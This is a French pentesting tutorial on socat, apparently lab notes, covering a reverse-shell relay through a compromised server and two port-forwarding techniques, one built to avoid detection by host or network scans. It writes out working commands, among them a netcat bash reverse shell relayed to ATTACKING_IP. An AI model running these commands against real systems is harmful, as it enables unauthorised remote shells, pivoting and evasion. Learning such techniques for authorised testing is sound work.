Il est préférable de considérer socat comme un moyen de joindre deux choses ensemble. il crée un lien entre deux emplacements différents. 

- Cela peut être deux ports sur la même machine
- Cela peut être pour créer un relais entre deux machines différentes
- Cela peut être pour créer une connexion entre un port et un fichier sur la machine à l'écoute, ou bien d'autres choses similaires. 

## Reverse shell Relay - Relais shell inverse

Dans ce scénario, nous utilisons socat pour créer un relais nous permettant de `renvoyer un shell inversé` à notre propre machine attaquante. 

- Commençons d'abord par un écouteur netcat sur notre KALI.
- Ensuite, sur le serveur compromis, utilisez la commande suivante pour démarrer le relais :
- De là, nous pouvons ensuite créer un reverse shell vers le port 8000 nouvellement ouvert sur le serveur compromis.

```sh
# KALI
nc -nlvp 4242
```

```sh
# SERVER COMPROMIS
socat tcp-l:8000 tcp:ATTACKING_IP:NETCAT_PORT &
nc  127.0.0.1 8000 -e /bin/bash
```

_Assurez-vous d'abord d'ouvrir le port d'écoute, puis de vous reconnecter à la machine attaquante._

De cette façon, nous pouvons configurer un relais pour envoyer des obus inversés à travers un système compromis, vers notre propre machine attaquante.

## Port Forwarding easy - Redirection de port facile

Le moyen rapide et facile de configurer une redirection de port avec socat consiste tout simplement à ouvrir un port d'écoute sur le serveur compromis et à rediriger tout ce qui y parvient vers le serveur cible. 

> Par exemple, si le serveur compromis est 172.16.0.5 et que la cible est le port 3306 de 172.16.0.10, nous pourrions utiliser la commande suivante (sur le serveur compromis) pour créer une redirection de port :

```sh
socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

Cela ouvre le port 33060 sur le serveur compromis et redirige l'entrée de la machine attaquante directement vers le serveur cible prévu, nous donnant essentiellement accès à la (probablement la base de données MySQL) fonctionnant sur notre cible de 172.16.0.10. 

L'option `fork` est utilisée pour mettre chaque connexion dans un nouveau processus, et l'option `reuseaddr` signifie que le port reste ouvert après qu'une connexion y est établie. 

Combinés, ils nous permettent d'utiliser le même transfert de port pour plusieurs connexions.

Nous pouvons maintenant nous connecter au port 33060 sur le relais (172.16.0.5) et avoir notre connexion directement relayée à notre cible prévue de 172.16.0.10:3306.

## Port Forwarding Quiet - Transfert de port Silencieux

La technique précédente est simple et rapide, mais elle ouvre également un port sur le serveur compromis, qui pourrait potentiellement être repéré par n'importe quel type d'analyse d'hôte ou de réseau. 

Cette méthode est légèrement plus complexe, mais ne nécessite pas l'ouverture d'un port externe sur le serveur compromis.

- Tout d'abord, sur notre propre machine attaquante:

```sh
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr 
```

Cela ouvre deux ports : 8000 et 8001, créant un relais de port local. Ce qui entre dans l'un sortira de l'autre.

- Ensuite, sur le serveur relais compromis (172.16.0.5 dans l'exemple précédent):

```sh
socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

Cela établit une connexion entre notre port d'écoute 8001 sur la machine attaquante et le port ouvert du serveur cible. 

- Pour utiliser le réseau fictif d'avant:

```sh
socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

Cela créerait un lien entre le port 8000 sur notre machine attaquante et le port 80 sur la cible visée (172.16.0.10), ce qui signifie que nous pourrions accéder au `localhost:8000` navigateur Web de notre machine attaquante pour charger la page Web desservie par la cible : 172.16.0.10 :80 !
